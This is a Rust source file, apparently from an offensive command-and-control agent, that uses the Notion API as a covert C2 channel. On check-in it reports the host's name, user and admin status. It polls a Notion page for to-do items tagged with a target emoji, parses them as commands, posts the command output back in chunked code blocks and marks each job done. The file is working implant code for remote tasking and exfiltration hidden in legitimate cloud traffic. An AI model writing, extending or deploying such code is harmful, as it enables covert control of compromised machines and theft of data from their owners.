use crate::channels::{Channel, ChannelError};
use crate::cmd::command_out;
use serde::{Serialize, Deserialize};
use base64::encode;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
use serde_json::{json, to_string};
use async_trait::async_trait;
use crate::logger::*;
use whoami::hostname;
use crate::cmd::AgentCommand;
use crate::cmd::getprivs::is_elevated;

/// This is a Notion limitation
const CHUNK_SIZE: usize = 2000;

/// Base Notion API URL
const URL_BASE: &str = "https://api.notion.com/v1";

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct NotionConfig {
    pub api_key: String,
    pub parent_page_id: String,
    pub page_id: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct NotionChannel {
    pub config: NotionConfig,
    #[serde(skip_serializing, skip_deserializing)]
    pub logger: Logger,
    #[serde(skip_serializing, skip_deserializing)]
    pub client: Client
}

// impl Serialize for NotionChannel {
//     fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
//     where
//         S: Serializer,
//     {
//         // 3 is the number of fields in the struct.
//         let mut state = serializer.serialize_struct("NotionChannel", 1)?;
//         state.serialize_field("config", &self.config)?;
//         state.end()
//     }
// }






impl NotionChannel {

    ///
    /// Constructor for [NotionChannel]
    /// The [NotionConfig] is coming in serialized because we've defined the types
    /// all the way down. When the full config file is loaded from wherever it's loaded,
    /// this struct will already exist and not need to be parsed here.
    /// 
    async fn new(config: NotionConfig, is_admin: bool, log_level: u64) -> Result<NotionChannel, ChannelError> {

        let logger = Logger::new(log_level);
        
        let client = NotionChannel::client(&config.api_key)?;
        Ok(NotionChannel {config, logger, client})

    }

    ///
    /// Generates an ad-hoc client for use with the Notion API.
    /// The client cannot be part of the `NotionChannel` struct because
    /// [Deserialize] is not implemented for [Client], and we need the entirety of the struct
    /// to be Json-ifiable.
    /// 
    /// So while we pay a minor memory and speed cost for spinning this up with each request,
    /// it's better than a global client getting passed around everywhere.
    /// 
    fn client(api_key: &str) -> Result<Client, ChannelError> {
        let mut headers = HeaderMap::new();

        headers.insert("Notion-Version", "2021-08-16".parse().unwrap());
        headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
        headers.insert(AUTHORIZATION, format!("Bearer {}", api_key).parse().unwrap());

        Ok(Client::builder()
            .default_headers(headers)
            .build().unwrap()
        )
    }

    /// Retrieves blocks from Notion. All children blocks of the parent page returned
    /// TODO: Account for pagination for > 100 children.
    pub async fn get_blocks(&self) -> Result<serde_json::Value, String> {
        let page_id = &self.config.page_id;
        let url = format!("{URL_BASE}/blocks/{page_id}/children");

        let r = self.client.get(url).send().await.unwrap();

        if r.status().is_success() {
            //println!("[*] Got blocks");
            let blocks = r.json::<serde_json::Value>().await.unwrap();
            match blocks.get("results") {
                Some(bs) => {
                    //println!("{:?}", bs);
                    return Ok(bs.to_owned())
                },
                None => return Ok(json!([]))
            }
        }
        Err(r.text().await.unwrap())
    }

}

#[async_trait]
impl Channel for NotionChannel {

    ///
    /// Utility function for creating Notion Pages
    /// Used during the build of a new [NotionChannel] in `NotionChannel::init
    /// 
    async fn init(&mut self, log_level: u64) -> Result<String, ChannelError> {

        // Assign logger
        self.logger = Logger::new(log_level);
        self.logger.info(format!("Creating page..."));

        // Get hostname
        let mut hn = hostname();

        let is_admin = is_elevated();  

        // Set client correctly
        let client = NotionChannel::client(&self.config.api_key)?;
        self.client = client;

        self.logger.info(log_out!("Hostname: ", &hn));
        self.logger.debug(format!("Config options: {:?}", self.config));

        // Get username
        let username = whoami::username();
        hn.push_str(" | ");
        hn.push_str(&username);

        self.logger.info(format!("Admin context: {}", is_admin));
        if is_admin {
            hn.push_str("*");
        }

        let url = format!("{}/pages/", URL_BASE);
        
        let is_admin = is_elevated();

        let check_in_emoji = match is_admin {
            true  => "#️⃣",
            false => "💲"
        };

        // let page_id = NotionChannel::create_page(&logger, &hn, is_admin)
        //     .await
        //     .unwrap();

        // Craft JSON Body
        let body: serde_json::Value = json!({
            "parent": {
                "type": "page_id",
                "page_id": self.config.parent_page_id
            },
            "icon": {
                "type": "emoji",
                "emoji": &check_in_emoji
            },
            "properties": {
                "title": [{
                    "text": {
                        "content": hn
                    }
                }]
            }
        });

        self.logger.debug(log_out!("Create Page URL: ", &url));

        let r = self.client
            .post(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        if r.status().is_success() {
            let res_body = r.json::<serde_json::Value>().await.unwrap();
            self.config.page_id = res_body["id"].as_str().unwrap().to_string();
            return Ok(String::from(res_body["id"].as_str().unwrap()));
        }


        let result_text = r.text().await.unwrap();
        // Annoying to_string() here because that's a move before the return
        self.logger.debug(result_text.to_string());
        Ok(result_text)    

    }

    async fn send(&self, data: String, command_block_id: &str) -> Result<String, ChannelError> {

        self.logger.debug(format!("{data}"));
        
        // This is a requirement of the Notion API.
        // There is a max block size, so large outputs
        // will get chunked.
        let chunks:Vec<serde_json::Value> = data
            .as_bytes()
            .chunks(CHUNK_SIZE)
            .map(|c| json!({
                "object": "block",
                "type": "code",
                "code": {
                    "text": [{
                        "type": "text",
                        "text": { "content": String::from_utf8(c.to_vec()).unwrap()},
                        "annotations": {"code": false}
                    }],
                    "language": "plain text"
                }
            }))
            .collect();


        let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
        let body : serde_json::Value = json!({
            "children": chunks
        });
        let r = self.client
            .patch(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        
        if r.status().is_success() {
            let result_text = r.text().await.unwrap();
            Ok(result_text)
        } else {
            let msg = r.status().as_str().to_owned();
            Err(ChannelError::new(&msg))
        }
    }

    /// Marks a job done by making the to-do item checked.
    async fn complete(&self, cmd: AgentCommand) -> () {
        
        // Set completed status
        let block_id = cmd.rel;
        let update_data = json!({
            "to_do": {
                "checked": true
            }
        });
        let url = format!("{URL_BASE}/blocks/{block_id}");
        let r = self.client
            .patch(url)
            .json(&update_data)
            .send()
            .await
            .unwrap();

        
        if !r.status().is_success() {
            let result_text = r.text().await.unwrap();
            self.logger.err(log_out!("Completion error:", &result_text)) ;
        } else {
            self.logger.debug(log_out!("Command completed"));
        }

        return ();
    }

    async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError> {
        let blocks = self.get_blocks().await.unwrap();

        let command_blocks: Vec<&serde_json::Value> = blocks
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&b| b["type"] == "to_do")
            .collect();

        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
            .into_iter()
            .filter(|&b| b["to_do"]["checked"] == false)
            .collect();

        let mut new_commands: Vec<AgentCommand> = Vec::new();
        for block in new_command_blocks {
            match block["to_do"]["text"][0]["text"]["content"].as_str() {
                Some(s) => {
                    if s.contains("🎯") {
                        self.logger.info(log_out!("Got command: ", s));
                        let mut agent_command = AgentCommand::from_string(s.replace("🎯","")).unwrap();
                        let command_block_id = block["id"].as_str().unwrap();
                        // Insert the command block id into the `AgentCommand` as `.rel`
                        agent_command.rel = command_block_id.to_string();
                        new_commands.push(agent_command);
                    };
                },
                None => { continue; }
            }
        }
        Ok(new_commands)
    }

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    /// 
    fn to_base64(&self) -> String {
        encode(to_string(&self.config).unwrap().as_bytes())
    }

    ///
    /// Updates the config
    /// TODO: Implement this
    /// 
    fn update(&self, options: String) -> Result<String, ChannelError> {

        command_out!("Config updated")
    }

}

